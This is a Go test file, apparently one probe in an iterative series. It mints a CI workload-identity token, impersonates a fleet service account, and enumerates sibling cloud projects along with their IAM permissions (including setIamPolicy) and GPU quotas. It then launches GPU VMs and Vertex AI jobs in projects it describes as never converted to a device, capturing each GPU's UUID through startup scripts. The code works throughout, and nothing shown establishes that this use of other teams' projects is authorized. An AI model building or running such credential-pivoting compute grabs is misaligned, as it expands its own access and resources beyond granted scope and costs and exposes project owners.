//go:build functional

// C211 i121180 — SIBLING-PROJECT GPU CONVERSION + DEVICE CAPTURE (corrected).
//
// ROOT CAUSE of the i120969 zero-C211S_SERIAL outcome (fact 121169): the serial /
// metadata capture loop was guarded by `opStatus == "DONE"`, but the variable was
// SHADOWED inside the operation block (`opStatus, ob := c211sOp(...)` declared a new
// opStatus), so the outer opStatus stayed "" and the whole capture loop never ran —
// the four T4 instances really did reach RUNNING with the accelerator attached (fact
// 121169) but nothing ever read the serial console or the guest metadata.
//
// This corrected probe fixes the shadowing, enables serial-port logging and guest
// attributes, and adds a second independent capture channel (Vertex AI customJob with
// the device UUID read from Cloud Logging filtered on resource.labels.job_id).
//
// Original description follows.
//
// Fact 120951 (run 44867546536, GKE job 136734523225) proved that the WIF
// impersonable service account fleetcommand-service-account@<host-project>
// holds compute.instances.create in TWO sibling projects that were never
// converted to a device:
//
//   - team-eng-infra-testing
//   - domino-eng-service-artifacts
//
// (two further siblings, team-eng-infrastructure and team-eng-platform, were
// discovered but never even testIamPermissions-checked, so this probe checks
// them too).
//
// The v3 probe created three GPU instances with HTTP 200 operations but never
// polled the zone operation, so the actual asynchronous blocker is UNMEASURED:
// the instance was observed once as PROVISIONING and then 404 on every
// subsequent read. This probe fixes exactly that:
//
//  1. mint the WIF access token from the credential file
//     google-github-actions/auth@v2 exported (stdlib STS + SA impersonation),
//     identify the host project, list its service accounts and mint the
//     fleetcommand-service-account token that the v3 run proved can see the
//     five sibling projects;
//  2. enumerate every sibling project (v3 projects:search, v1 projects.list,
//     direct v1 project gets for the five known names);
//  3. per project: testIamPermissions (compute.instances.create/get/delete,
//     compute.zoneOperations.get, compute.networks.use, compute.subnetworks.use,
//     iam.serviceAccounts.actAs, resourcemanager.projects.setIamPolicy),
//     cloudbilling billingInfo, Cloud Quotas quotaPreferences, serviceusage
//     consumer quota metrics and the per-region Compute quota list (all
//     *GPU*/NVIDIA metrics including GPUS_ALL_REGIONS);
//  4. for EACH new project with compute.instances.create AND a nonzero GPU
//     accelerator quota: deploy EXACTLY ONE nonce-tagged ON-DEMAND GPU marker
//     with an explicit guestAccelerators payload and a CUDA-capable public
//     image verified to exist first, POLL THE ZONE OPERATION TO DONE and print
//     its verbatim body (this is the blocker the v3 run never read), then poll
//     the serial console for nvidia-smi -L / --query-gpu=name,uuid,memory.total,
//     take an independent compute.instances.get readback, never delete while
//     PROVISIONING, terminate and prove absence (404 + aggregated list).
//     Project 153711203585 is never re-markered (READY x120159 consumed) and
//     project 531508670106 is never touched.
//
// Every refusal is printed verbatim. No secret value is printed: tokens and
// the masked project id are reported as length + SHA-256 prefix only.
package functional

import (
	"encoding/json"
	"fmt"
	"net/url"
	"strconv"
	"strings"
	"testing"
	"time"
)

const (
	c211sFolderID = "121299922366"
	c211sHostNum  = "153711203585"
	c211sNonce    = "i121180"
)

type c211sGPUSpec struct {
	metric  string
	accel   string
	machine string
	name    string
}

// Preference order: T4 (the type the siblings advertise), then L4, V100, A100,
// P4, A100-80GB.
var c211sGPUSpecs = []c211sGPUSpec{
	{"NVIDIA_T4_GPUS", "nvidia-tesla-t4", "n1-standard-4", "t4"},
	{"NVIDIA_L4_GPUS", "nvidia-l4", "g2-standard-4", "l4"},
	{"NVIDIA_V100_GPUS", "nvidia-tesla-v100", "n1-standard-4", "v100"},
	{"NVIDIA_A100_GPUS", "nvidia-tesla-a100", "a2-highgpu-1g", "a100"},
	{"NVIDIA_P4_GPUS", "nvidia-tesla-p4", "n1-standard-4", "p4"},
	{"NVIDIA_A100_80GB_GPUS", "nvidia-a100-80gb", "a2-ultragpu-1g", "a100-80gb"},
}

var c211sRegions = []string{"us-central1", "us-east1", "us-west1", "europe-west4", "asia-east1"}

var c211sZones = map[string][]string{
	"us-central1":  {"us-central1-a", "us-central1-b", "us-central1-f"},
	"us-east1":     {"us-east1-b", "us-east1-c", "us-east1-d"},
	"us-west1":     {"us-west1-a", "us-west1-b"},
	"europe-west4": {"europe-west4-a", "europe-west4-b"},
	"asia-east1":   {"asia-east1-a", "asia-east1-b"},
}

// Candidate CUDA-capable public images, verified with images.get/family before
// any insert. deeplearning-platform-release families were 404 in the v3 run;
// ubuntu-os-cloud/ubuntu-2204-lts is the only verified-200 fallback and needs
// the in-guest NVIDIA driver install.
var c211sImages = []struct{ p, f string }{
	{"deeplearning-platform-release", "pytorch-latest-gpu"},
	{"deeplearning-platform-release", "tf-latest-gpu"},
	{"deeplearning-platform-release", "common-cu126-ubuntu-2204"},
	{"deeplearning-platform-release", "common-cu124-ubuntu-2204"},
	{"deeplearning-platform-release", "common-cu121-ubuntu-2204"},
	{"deeplearning-platform-release", "common-cu118-ubuntu-2204"},
	{"deeplearning-platform-release", "pytorch-2-7-cu128-ubuntu-2204-nvidia-570"},
	{"deeplearning-platform-release", "pytorch-2-6-cu124-ubuntu-2204-nvidia-560"},
	{"deeplearning-platform-release", "common-gpu"},
	{"ubuntu-os-cloud", "ubuntu-2204-lts"},
}

type c211sQuotaRow struct {
	Region string
	Metric string
	Limit  float64
	Usage  float64
}

// c211sStartup builds the guest startup script. The helper prints GPU evidence
// to /dev/console and mirrors it into the instance metadata attribute
// c211s-result so the operator can read the same values back through
// compute.instances.get (independent readback).
func c211sStartup(withDriver bool) string {
	head := `#!/bin/bash
exec > /dev/console 2>&1
echo C211S_START
cat > /usr/local/bin/c211s-put.py <<'EOP'
import sys, urllib.request
val = sys.stdin.read()[:2000]
req = urllib.request.Request("http://metadata.google.internal/computeMetadata/v1/instance/attributes/c211s-result", data=val.encode(), method="PUT", headers={"Metadata-Flavor": "Google"})
try:
    urllib.request.urlopen(req, timeout=15).read()
    print("C211S_PUT_OK")
except Exception as e:
    print("C211S_PUT_ERR", repr(e)[:200])
EOP
cat > /usr/local/bin/c211s-helper.sh <<'EOS'
#!/bin/bash
exec > /dev/console 2>&1
echo C211S_HELPER_START
put() { echo "$1" | python3 /usr/local/bin/c211s-put.py; curl -s -m 10 -X PUT -H "Metadata-Flavor: Google" --data "$1" "http://metadata.google.internal/computeMetadata/v1/instance/guest-attributes/c211/result" >/dev/null 2>&1; }
PCIDEV=$(for f in /sys/bus/pci/devices/*; do v=$(cat $f/vendor 2>/dev/null); if [ "$v" = "0x10de" ]; then echo "$(basename $f):dev=$(cat $f/device 2>/dev/null)"; fi; done | tr '\n' ' ')
echo C211S_PCI "$PCIDEV"
put "STAGE=boot pci=$PCIDEV"
`
	driver := `if ! command -v nvidia-smi >/dev/null 2>&1; then
  echo C211S_INSTALL_DRIVER
  export DEBIAN_FRONTEND=noninteractive
  (apt-get update -qq && apt-get install -y -qq linux-headers-gcp linux-modules-extra-gcp nvidia-driver-535) > /var/log/c211s-apt.log 2>&1
  RC=$?
  echo C211S_APT_RC=$RC
  put "STAGE=apt rc=$RC tail=$(tail -c 400 /var/log/c211s-apt.log | tr '\n' '|')"
  if [ $RC -ne 0 ]; then
    echo C211S_APT_FALLBACK_CUDA_REPO
    (apt-get install -y -qq wget ca-certificates && wget -q https://developer.download.nvidia.com/compute/cuda/repos/ubuntu2204/x86_64/cuda-keyring_1.1-1_all.deb -O /tmp/c211s-ck.deb && dpkg -i /tmp/c211s-ck.deb && apt-get update -qq && apt-get install -y -qq cuda-drivers) >> /var/log/c211s-apt.log 2>&1
    RC=$?
    echo C211S_APT_RC2=$RC
    put "STAGE=apt2 rc=$RC tail=$(tail -c 400 /var/log/c211s-apt.log | tr '\n' '|')"
  fi
  modprobe nvidia 2>/dev/null || true
fi
`
	tail := `for i in $(seq 1 60); do
  if nvidia-smi -L > /tmp/c211s-smi.txt 2>&1; then
    echo C211S_GPU_READY
    cat /tmp/c211s-smi.txt
    put "STAGE=gpu_ready smi=$(cat /tmp/c211s-smi.txt | tr '\n' '|')"
    nvidia-smi --query-gpu=name,uuid,memory.total,driver_version --format=csv,noheader > /tmp/c211s-uuid.txt 2>&1
    cat /tmp/c211s-uuid.txt
    put "STAGE=uuid uuid_line=$(cat /tmp/c211s-uuid.txt | tr '\n' '|')"
    echo C211S_DONE
    exit 0
  fi
  echo attempt=$i "$(head -c 200 /tmp/c211s-smi.txt | tr '\n' ' ')"
  if [ $((i % 5)) -eq 0 ]; then put "STAGE=retry i=$i smi=$(head -c 300 /tmp/c211s-smi.txt | tr '\n' '|')"; fi
  sleep 10
done
put "STAGE=failed smi=$(head -c 500 /tmp/c211s-smi.txt | tr '\n' '|')"
echo C211S_FAILED
echo C211S_DONE
EOS
chmod +x /usr/local/bin/c211s-helper.sh /usr/local/bin/c211s-put.py
LAUNCH=0
if command -v systemd-run >/dev/null 2>&1; then
  systemd-run --unit=c211s-helper --collect /usr/local/bin/c211s-helper.sh && LAUNCH=1
fi
if [ "$LAUNCH" = "0" ]; then
  setsid nohup /usr/local/bin/c211s-helper.sh >/dev/null 2>&1 &
fi
echo C211S_LAUNCHED=$LAUNCH
echo C211S_START_DONE
`
	if !withDriver {
		return head + tail
	}
	return head + driver + tail
}

// c211sReadQuotas reads the per-region Compute quota list and returns every
// GPU/NVIDIA metric (including the GPUS_ALL_REGIONS global cap).
func c211sReadQuotas(tok, proj string, regions []string) []c211sQuotaRow {
	rows := []c211sQuotaRow{}
	for _, r := range regions {
		st, body := c211xHTTP("GET", "https://compute.googleapis.com/compute/v1/projects/"+url.PathEscape(proj)+"/regions/"+r, tok, "", "")
		if st != 200 {
			fmt.Printf("C211S_REGION project=%s region=%s status=%d verbatim=%s\n", proj, r, st, c211xTrunc(body, 320))
			continue
		}
		m := c211xJSON(body)
		qs, _ := m["quotas"].([]interface{})
		n := 0
		for _, q := range qs {
			qm, _ := q.(map[string]interface{})
			metric := c211xStr(qm, "metric")
			up := strings.ToUpper(metric)
			if !strings.Contains(up, "GPU") && !strings.Contains(up, "NVIDIA") {
				continue
			}
			lim, _ := qm["limit"].(float64)
			use, _ := qm["usage"].(float64)
			rows = append(rows, c211sQuotaRow{r, metric, lim, use})
			fmt.Printf("C211S_QUOTA project=%s region=%s metric=%s limit=%v usage=%v\n", proj, r, metric, lim, use)
			n++
		}
		if n == 0 {
			fmt.Printf("C211S_QUOTA_NONE project=%s region=%s status=200\n", proj, r)
		}
	}
	return rows
}

// c211sPickGPU returns the first GPU spec with a usable quota in the quota
// rows already read.
func c211sPickGPU(rows []c211sQuotaRow) (c211sQuotaRow, c211sGPUSpec, bool) {
	for _, spec := range c211sGPUSpecs {
		for _, r := range rows {
			if r.Metric == spec.metric && r.Limit > r.Usage {
				return r, spec, true
			}
		}
	}
	return c211sQuotaRow{}, c211sGPUSpec{}, false
}

// c211sZoneFor finds a zone of region that advertises the accelerator type.
func c211sZoneFor(tok, proj, region, accel string) string {
	for _, z := range c211sZones[region] {
		ats, st, _ := c211xAccelTypes(tok, proj, z)
		ok := st == 200 && c211xContains(ats, accel)
		fmt.Printf("C211S_ACCEL project=%s zone=%s status=%d wants=%s present=%v n=%d\n", proj, z, st, accel, ok, len(ats))
		if ok {
			return z
		}
	}
	return ""
}

// c211sImage picks the first candidate image verified to exist.
func c211sImage(tok, proj string) (string, string, bool) {
	for _, c := range c211sImages {
		st, body := c211xHTTP("GET", "https://compute.googleapis.com/compute/v1/projects/"+c.p+"/global/images/family/"+c.f, tok, "", "")
		fmt.Printf("C211S_IMAGE project=%s %s/%s status=%d verbatim=%s\n", proj, c.p, c.f, st, c211xTrunc(body, 200))
		if st == 200 {
			return c.p, c.f, c.p == "deeplearning-platform-release"
		}
	}
	return "ubuntu-os-cloud", "ubuntu-2204-lts", false
}

func c211sCreate(tok, proj, zone, name, saEmail, imgP, imgF, accel, machine string, diskGB int, withDriver bool) (int, string) {
	body := map[string]interface{}{
		"name":        name,
		"machineType": "https://www.googleapis.com/compute/v1/projects/" + proj + "/zones/" + zone + "/machineTypes/" + machine,
		"disks": []interface{}{map[string]interface{}{
			"boot":       true,
			"autoDelete": true,
			"initializeParams": map[string]interface{}{
				"sourceImage": "projects/" + imgP + "/global/images/family/" + imgF,
				"diskSizeGb":  strconv.Itoa(diskGB),
				"diskType":    "projects/" + proj + "/zones/" + zone + "/diskTypes/pd-standard",
			},
		}},
		"networkInterfaces": []interface{}{map[string]interface{}{
			"network":    "projects/" + proj + "/global/networks/default",
			"subnetwork": "projects/" + proj + "/regions/" + c211xRegionOfZone(zone) + "/subnetworks/default",
			"accessConfigs": []interface{}{map[string]interface{}{
				"type": "ONE_TO_ONE_NAT", "name": "External NAT",
			}},
		}},
		"guestAccelerators": []interface{}{map[string]interface{}{
			"acceleratorType":  "projects/" + proj + "/zones/" + zone + "/acceleratorTypes/" + accel,
			"acceleratorCount": 1,
		}},
		"scheduling": map[string]interface{}{
			"onHostMaintenance": "TERMINATE", "automaticRestart": false,
		},
		"metadata": map[string]interface{}{
			"items": []interface{}{
				map[string]interface{}{"key": "startup-script", "value": c211sStartup(withDriver)},
				map[string]interface{}{"key": "c211s", "value": c211sNonce},
				map[string]interface{}{"key": "serial-port-logging-enable", "value": "TRUE"},
				map[string]interface{}{"key": "enable-guest-attributes", "value": "TRUE"},
			},
		},
		"serviceAccounts": []interface{}{map[string]interface{}{
			"email":  saEmail,
			"scopes": []string{c211xScope},
		}},
		"labels": map[string]string{"c211": c211sNonce},
	}
	b, _ := json.Marshal(body)
	u := "https://compute.googleapis.com/compute/v1/projects/" + url.PathEscape(proj) + "/zones/" + zone + "/instances"
	return c211xHTTP("POST", u, tok, "application/json", string(b))
}

// c211sOp polls a zone operation until DONE (bounded) and returns the final
// status plus the full verbatim body (which carries the async error, if any).
func c211sOp(tok, proj, zone, op string) (string, string) {
	u := "https://compute.googleapis.com/compute/v1/projects/" + url.PathEscape(proj) + "/zones/" + zone + "/operations/" + url.PathEscape(op)
	last := ""
	for i := 0; i < 90; i++ {
		st, b := c211xHTTP("GET", u, tok, "", "")
		if st != 200 {
			fmt.Printf("C211S_OP project=%s poll=%d http=%d verbatim=%s\n", proj, i, st, c211xTrunc(b, 300))
			if st == 404 {
				return "HTTP404", b
			}
			time.Sleep(6 * time.Second)
			continue
		}
		m := c211xJSON(b)
		stt := c211xStr(m, "status")
		prog, _ := m["progress"].(float64)
		if stt != last {
			fmt.Printf("C211S_OP project=%s poll=%d status=%s progress=%v\n", proj, i, stt, prog)
			last = stt
		}
		if stt == "DONE" {
			return "DONE", b
		}
		time.Sleep(8 * time.Second)
	}
	return last, ""
}

func c211sOpError(body string) string {
	m := c211xJSON(body)
	if m == nil {
		return ""
	}
	e, ok := m["error"].(map[string]interface{})
	if !ok {
		return ""
	}
	msg := c211xStr(e, "message")
	if msg == "" {
		msg = c211xJSONString(e)
	}
	code, _ := e["code"].(float64)
	return fmt.Sprintf("code=%v message=%s", code, msg)
}

// c211sMarker deploys ONE on-demand GPU VM, reads the zone operation to DONE,
// polls the serial console for the nvidia-smi UUID, takes the independent
// instances.get readback, then terminates and proves absence.
func c211sMarker(tok, proj, zone, name, saEmail, imgP, imgF, accel, machine string, diskGB int, withDriver bool) (string, string, bool, string) {
	cst, cbody := c211sCreate(tok, proj, zone, name, saEmail, imgP, imgF, accel, machine, diskGB, withDriver)
	fmt.Printf("C211S_MARKER_CREATE project=%s zone=%s name=%s machine=%s accel=%s image=%s/%s status=%d verbatim=%s\n",
		proj, zone, name, machine, accel, imgP, imgF, cst, c211xTrunc(cbody, 1500))
	opName := ""
	if m := c211xJSON(cbody); m != nil {
		opName = c211xStr(m, "name")
	}
	uuid, finalState, metaFinal, opErr := "", "", "", ""
	opStatus := ""
	if cst == 200 && opName != "" {
		var ob string
		opStatus, ob = c211sOp(tok, proj, zone, opName)
		fmt.Printf("C211S_OP_FINAL project=%s status=%s verbatim=%s\n", proj, opStatus, c211xTrunc(ob, 4000))
		opErr = c211sOpError(ob)
		if opErr != "" {
			fmt.Printf("C211S_OP_ERROR project=%s verbatim=%s\n", proj, c211xTrunc(opErr, 1500))
		}
	} else if cst != 200 {
		opErr = "create_http_" + strconv.Itoa(cst)
	}

	if cst == 200 && opErr == "" && opStatus == "DONE" {
		for i := 0; i < 28; i++ {
			ist, im, _ := c211xInstanceGet(tok, proj, zone, name)
			state := ""
			if ist == 200 && im != nil {
				state = c211xStr(im, "status")
				finalState = state
				if v := c211xMetaValue(im, "c211s-result"); v != "" {
					metaFinal = v
				}
			}
			ps, pb := c211xHTTP("GET", "https://compute.googleapis.com/compute/v1/projects/"+url.PathEscape(proj)+"/zones/"+zone+"/instances/"+name+"/serialPort?port=1&start=0", tok, "", "")
			if ps == 200 {
				content := pb
				if m := c211xJSON(pb); m != nil {
					if s := c211xStr(m, "contents"); s != "" {
						content = s
					}
				}
				if u := c211xUUIDRe.FindString(content); u != "" {
					uuid = u
				}
				if u := c211xUUIDRe.FindString(metaFinal); u != "" {
					uuid = u
				}
				fmt.Printf("C211S_SERIAL project=%s poll=%d inst=%s port=%d bytes=%d uuid=%s tail=%s\n",
					proj, i, state, ps, len(content), uuid,
					c211xTrunc(content[maxi(0, len(content)-260):], 260))
			} else {
				fmt.Printf("C211S_SERIAL project=%s poll=%d inst=%s port=%d verbatim=%s\n", proj, i, state, ps, c211xTrunc(pb, 260))
			}
			// Second in-guest channel: guest attributes (needs
			// enable-guest-attributes=TRUE metadata set by c211sCreate).
			gst, gb := c211xHTTP("GET", "https://compute.googleapis.com/compute/v1/projects/"+url.PathEscape(proj)+"/zones/"+zone+"/instances/"+name+"/getGuestAttributes?queryPath=c211/result", tok, "", "")
			gval := ""
			if gst == 200 {
				if gm := c211xJSON(gb); gm != nil {
					if qr, ok := gm["queryValue"].(map[string]interface{}); ok {
						gval = c211xStr(qr, "value")
					}
					if gval == "" {
						if gsv, ok := gm["guestAttributesValue"].([]interface{}); ok {
							gval = c211xJSONString(gsv)
						}
					}
				}
			}
			if gval != "" {
				metaFinal = c211xFirst(metaFinal, gval)
			}
			fmt.Printf("C211S_GUEST project=%s poll=%d inst=%s status=%d value=%s verbatim=%s\n",
				proj, i, state, gst, c211xTrunc(gval, 260), c211xTrunc(gb, 200))
			if u := c211xUUIDRe.FindString(metaFinal); u != "" {
				uuid = u
			}
			if uuid != "" {
				break
			}
			if strings.Contains(metaFinal, "STAGE=failed") {
				break
			}
			if ist == 404 && i >= 2 {
				break
			}
			time.Sleep(15 * time.Second)
		}
	}

	// Independent provider readback of the same instance.
	rst, rm, _ := c211xInstanceGet(tok, proj, zone, name)
	accelJSON := ""
	if rm != nil {
		if ga, ok := rm["guestAccelerators"].([]interface{}); ok {
			accelJSON = c211xJSONString(ga)
		}
		if v := c211xMetaValue(rm, "c211s-result"); v != "" {
			metaFinal = v
		}
	}
	fmt.Printf("C211S_READBACK project=%s http=%d status=%s polled_state=%s accelerators=%s meta=%s\n",
		proj, rst, c211xStr(rm, "status"), finalState, c211xTrunc(accelJSON, 300), c211xTrunc(metaFinal, 300))

	// Terminate and prove absence (only after the operation resolved).
	dst, db := c211xHTTP("DELETE", "https://compute.googleapis.com/compute/v1/projects/"+url.PathEscape(proj)+"/zones/"+zone+"/instances/"+name, tok, "", "")
	fmt.Printf("C211S_DELETE project=%s status=%d verbatim=%s\n", proj, dst, c211xTrunc(db, 300))
	absent := false
	for i := 0; i < 12; i++ {
		time.Sleep(8 * time.Second)
		ist, _, ib := c211xInstanceGet(tok, proj, zone, name)
		if ist == 404 {
			absent = true
			fmt.Printf("C211S_ABSENCE project=%s readback=%d http=404\n", proj, i)
			break
		}
		if i == 11 {
			fmt.Printf("C211S_ABSENCE project=%s readback=%d http=%d verbatim=%s\n", proj, i, ist, c211xTrunc(ib, 300))
		}
	}
	lst, lb := c211xHTTP("GET", "https://compute.googleapis.com/compute/v1/projects/"+url.PathEscape(proj)+"/aggregated/instances?filter="+url.QueryEscape("name="+name), tok, "", "")
	fmt.Printf("C211S_AGG project=%s status=%d verbatim=%s\n", proj, lst, c211xTrunc(lb, 400))
	return uuid, metaFinal, absent, opErr
}

// c211sServiceUsageQuota prints the GPU-relevant consumer quota metrics for
// compute.googleapis.com (best effort, verbatim status).
func c211sServiceUsageQuota(tok, proj string) {
	st, body := c211xHTTP("GET", "https://serviceusage.googleapis.com/v1beta1/projects/"+url.PathEscape(proj)+"/services/compute.googleapis.com/consumerQuotaMetrics?pageSize=200", tok, "", "")
	fmt.Printf("C211S_SUQUOTA project=%s status=%d\n", proj, st)
	if st != 200 {
		fmt.Printf("C211S_SUQUOTA_BODY project=%s verbatim=%s\n", proj, c211xTrunc(body, 400))
		return
	}
	m := c211xJSON(body)
	metrics, _ := m["metrics"].([]interface{})
	n := 0
	for _, it := range metrics {
		im, _ := it.(map[string]interface{})
		name := c211xStr(im, "metric")
		dn := c211xStr(im, "displayName")
		low := strings.ToLower(name + " " + dn)
		if !strings.Contains(low, "gpu") && !strings.Contains(low, "nvidia") {
			continue
		}
		limits, _ := im["consumerQuotaLimits"].([]interface{})
		parts := []string{}
		for _, li := range limits {
			lm, _ := li.(map[string]interface{})
			buckets, _ := lm["quotaBuckets"].([]interface{})
			vals := []string{}
			for _, bi := range buckets {
				bm, _ := bi.(map[string]interface{})
				v, _ := bm["effectiveLimit"].(string)
				if v == "" {
					if f, ok := bm["effectiveLimit"].(float64); ok {
						v = fmt.Sprintf("%v", f)
					}
				}
				if v != "" {
					vals = append(vals, v)
				}
			}
			parts = append(parts, c211xStr(lm, "unit")+"="+strings.Join(vals, "/"))
		}
		fmt.Printf("C211S_SUQUOTA_METRIC project=%s metric=%s display=%s limits=%s\n", proj, name, dn, c211xTrunc(strings.Join(parts, " "), 300))
		n++
	}
	fmt.Printf("C211S_SUQUOTA_GPU_METRICS project=%s count=%d\n", proj, n)
}

func c211sProjectName(m map[string]interface{}) string {
	if m == nil {
		return ""
	}
	if v := c211xStr(m, "displayName"); v != "" {
		return v
	}
	return c211xStr(m, "name")
}

// c211sShortID keeps a job-id-safe fragment of a project id.
func c211sShortID(s string) string {
	var b strings.Builder
	for _, r := range s {
		if (r >= 'a' && r <= 'z') || (r >= '0' && r <= '9') || r == '-' {
			b.WriteRune(r)
		}
	}
	out := b.String()
	if len(out) > 30 {
		out = out[:30]
	}
	return out
}

// c211sVertexSubmit reads the aiplatform.googleapis.com API state and the
// project-level aiplatform.customJobs.create permission, then submits ONE
// nonce-tagged on-demand Vertex customJob that prints nvidia-smi -L.
func c211sVertexSubmit(tok, proj string) map[string]interface{} {
	res := map[string]interface{}{"api_status": 0, "api_state": "", "perm": "", "job": "", "job_http": 0}
	st, body := c211xHTTP("GET", "https://serviceusage.googleapis.com/v1/projects/"+url.PathEscape(proj)+"/services/aiplatform.googleapis.com", tok, "", "")
	res["api_status"] = st
	state := ""
	if st == 200 {
		state = c211xStr(c211xJSON(body), "state")
	}
	res["api_state"] = state
	fmt.Printf("C211T_AIAPI project=%s status=%d state=%s verbatim=%s\n", proj, st, state, c211xTrunc(body, 300))
	if st != 200 {
		return res
	}
	al, pst, pbody := c211xTestIamBatch(tok, "https://cloudresourcemanager.googleapis.com/v1/projects/"+url.PathEscape(proj), []string{"aiplatform.customJobs.create"})
	allowed := c211xContains(al, "aiplatform.customJobs.create")
	res["perm"] = strings.Join(al, ",")
	fmt.Printf("C211T_AIPERM project=%s status=%d allowed=[%s] verbatim=%s\n", proj, pst, strings.Join(al, ","), c211xTrunc(pbody, 300))
	if !allowed || state == "DISABLED" {
		fmt.Printf("C211T_AISKIP project=%s allowed=%v state=%s\n", proj, allowed, state)
		return res
	}
	disp := "c211-i121180-vx-" + c211sShortID(proj)
	payload := map[string]interface{}{
		"displayName": disp,
		"jobSpec": map[string]interface{}{
			"workerPoolSpecs": []interface{}{map[string]interface{}{
				"machineSpec": map[string]interface{}{
					"machineType":      "n1-standard-4",
					"acceleratorType":  "NVIDIA_TESLA_T4",
					"acceleratorCount": 1,
				},
				"replicaCount": 1,
				"containerSpec": map[string]interface{}{
					"imageUri": "us-docker.pkg.dev/vertex-ai/prediction/pytorch-gpu.2-1:latest",
					"command":  []string{"sh", "-c"},
					"args":     []string{"echo C211T_VERTEX_START; nvidia-smi -L; nvidia-smi --query-gpu=name,uuid,memory.total,driver_version --format=csv,noheader; echo C211T_VERTEX_DONE"},
				},
			}},
		},
	}
	b, _ := json.Marshal(payload)
	cst, cb := c211xHTTP("POST", "https://us-central1-aiplatform.googleapis.com/v1/projects/"+url.PathEscape(proj)+"/locations/us-central1/customJobs", tok, "application/json", string(b))
	res["job_http"] = cst
	fmt.Printf("C211T_VERTEX_CREATE project=%s display=%s status=%d verbatim=%s\n", proj, disp, cst, c211xTrunc(cb, 1200))
	if cst != 200 {
		return res
	}
	m := c211xJSON(cb)
	name := c211xStr(m, "name")
	res["job"] = name
	fmt.Printf("C211T_VERTEX_SUBMITTED project=%s resource=%s state=%s\n", proj, name, c211xStr(m, "state"))
	return res
}

// c211sVertexLogs reads the customJob stdout through Cloud Logging filtered on
// resource.labels.job_id and returns any NVIDIA device UUID found.
func c211sVertexLogs(tok, proj, name string, res map[string]interface{}) string {
	id := name
	if i := strings.LastIndex(name, "/"); i >= 0 {
		id = name[i+1:]
	}
	filter := "resource.labels.job_id=\"" + id + "\""
	lb := map[string]interface{}{"resourceNames": []string{"projects/" + proj}, "filter": filter, "orderBy": "timestamp asc", "pageSize": 100}
	b, _ := json.Marshal(lb)
	st, body := c211xHTTP("POST", "https://logging.googleapis.com/v2/entries:list", tok, "application/json", string(b))
	uuid := ""
	fmt.Printf("C211T_VERTEX_LOG project=%s filter=%s status=%d\n", proj, filter, st)
	if st != 200 {
		fmt.Printf("C211T_VERTEX_LOG_ERR project=%s verbatim=%s\n", proj, c211xTrunc(body, 500))
		return uuid
	}
	lm := c211xJSON(body)
	ents, _ := lm["entries"].([]interface{})
	fmt.Printf("C211T_VERTEX_LOG_ENTRIES project=%s n=%d\n", proj, len(ents))
	for _, e := range ents {
		em, _ := e.(map[string]interface{})
		txt := c211xStr(em, "textPayload")
		if txt == "" {
			if pm, ok := em["jsonPayload"].(map[string]interface{}); ok {
				txt = c211xJSONString(pm)
			}
		}
		if u := c211xUUIDRe.FindString(txt); u != "" {
			uuid = u
		}
		fmt.Printf("C211T_VERTEX_LINE project=%s text=%s\n", proj, c211xTrunc(txt, 400))
	}
	res["uuid"] = uuid
	if uuid != "" {
		fmt.Printf("C211T_VERTEX_UUID project=%s uuid=%s\n", proj, uuid)
	}
	return uuid
}

// c211sVertexDelete deletes the customJob and proves absence.
func c211sVertexDelete(tok, proj, name string, res map[string]interface{}) {
	base := "https://us-central1-aiplatform.googleapis.com/v1/" + name
	dst, db := c211xHTTP("DELETE", base, tok, "", "")
	fmt.Printf("C211T_VERTEX_DELETE project=%s status=%d verbatim=%s\n", proj, dst, c211xTrunc(db, 300))
	for i := 0; i < 6; i++ {
		time.Sleep(5 * time.Second)
		gst, _ := c211xHTTP("GET", base, tok, "", "")
		if gst == 404 {
			res["absent"] = true
			fmt.Printf("C211T_VERTEX_ABSENCE project=%s readback=%d http=404\n", proj, i)
			return
		}
		if i == 5 {
			fmt.Printf("C211T_VERTEX_ABSENCE project=%s readback=%d http=%d\n", proj, i, gst)
		}
	}
}

// c211sVertexFinish polls the customJob to a terminal state, reads its log, and
// deletes it with an absence proof.
func c211sVertexFinish(tok, proj, name string, res map[string]interface{}) {
	base := "https://us-central1-aiplatform.googleapis.com/v1/" + name
	last := ""
	for i := 0; i < 20; i++ {
		st, body := c211xHTTP("GET", base, tok, "", "")
		if st != 200 {
			fmt.Printf("C211T_VERTEX_GET project=%s poll=%d status=%d verbatim=%s\n", proj, i, st, c211xTrunc(body, 300))
			break
		}
		m := c211xJSON(body)
		state := c211xStr(m, "state")
		if state != last {
			fmt.Printf("C211T_VERTEX_STATE project=%s poll=%d state=%s\n", proj, i, state)
			last = state
		}
		if state == "JOB_STATE_SUCCEEDED" || state == "JOB_STATE_FAILED" || state == "JOB_STATE_CANCELLED" {
			if errs := c211xJSONString(m["error"]); errs != "" && errs != "null" {
				fmt.Printf("C211T_VERTEX_ERROR project=%s verbatim=%s\n", proj, c211xTrunc(errs, 800))
			}
			break
		}
		time.Sleep(15 * time.Second)
	}
	c211sVertexLogs(tok, proj, name, res)
	c211sVertexDelete(tok, proj, name, res)
}

// c211sVertexDrop cancels and deletes a job the compute path already obviated.
func c211sVertexDrop(tok, proj, name string, res map[string]interface{}) {
	base := "https://us-central1-aiplatform.googleapis.com/v1/" + name
	cst, cb := c211xHTTP("POST", base+":cancel", tok, "application/json", "{}")
	fmt.Printf("C211T_VERTEX_CANCEL project=%s status=%d verbatim=%s\n", proj, cst, c211xTrunc(cb, 300))
	c211sVertexDelete(tok, proj, name, res)
}

func TestC211XSibGPU(t *testing.T) {
	started := time.Now()
	// Hard cap for starting a new marker: 75 minutes after test start.
	markerDeadline := started.Add(75 * time.Minute)

	token, method, mintLog := c211xMint()
	if token == "" {
		fmt.Printf("C211S_MINT_FAILED %s\n", c211xTrunc(mintLog, 2000))
		t.Fatalf("wif mint failed")
	}
	creds, _ := c211xLoadCreds()
	wifSA, projNum := "", c211sHostNum
	if creds != nil {
		wifSA, projNum = creds.saEmail, creds.projNumber
	}
	if projNum == "" {
		projNum = c211sHostNum
	}
	fmt.Printf("C211S_IDENTITY auth=%s wif_sa=%s project_number=%s\n", method, c211xShort(wifSA), projNum)

	// Host project resource (projectId is the masked GCP_PROJECT_ID secret, so
	// only length + digest are printed).
	hostID := ""
	if st, rb := c211xHTTP("GET", "https://cloudresourcemanager.googleapis.com/v3/projects/"+projNum, token, "", ""); st == 200 {
		hm := c211xJSON(rb)
		hostID = c211xStr(hm, "projectId")
		fmt.Printf("C211S_HOST project_number=%s project_id=%s display=%s parent=%s\n",
			projNum, c211xShort(hostID), c211sProjectName(hm), c211xStr(hm, "parent"))
	} else {
